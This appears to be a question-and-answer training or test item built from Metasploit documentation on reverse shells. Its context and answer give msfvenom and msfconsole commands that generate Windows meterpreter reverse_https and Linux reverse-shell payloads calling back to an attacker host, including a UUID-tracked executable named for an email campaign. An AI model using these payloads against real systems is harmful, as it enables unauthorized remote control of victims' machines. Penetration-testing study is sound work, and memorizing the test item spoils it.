Context:### Windows common reverse shell
### Linux common reverse shell
## When to use a reverse shell
## When a reverse shell isn't needed
## How to set up for a reverse shell during payload generation
## Demonstration
### Step 1: Generate the executable payload
On the attacker's box, run `msfpayload` or `msfvenom`:
```bash
$ ./msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
```
$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=EmailCampaign20150101 -f exe -o payload.exe
# Generate a payload for use within C
msf6 payload(linux/x86/shell_reverse_tcp) > generate -f c

# Generate an ELF file for execution on Linux environments
msf6 payload(linux/x86/shell_reverse_tcp) > generate -f elf -o linux_shell

 Question: Generate an example of using msfvenom to create a Windows payload with the UUID technique. The payload must use reverse_https. Your response should be a single line of Bash code. 

 Your response: 
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=EmailCampaign20150101 -f exe -o payload.exe
```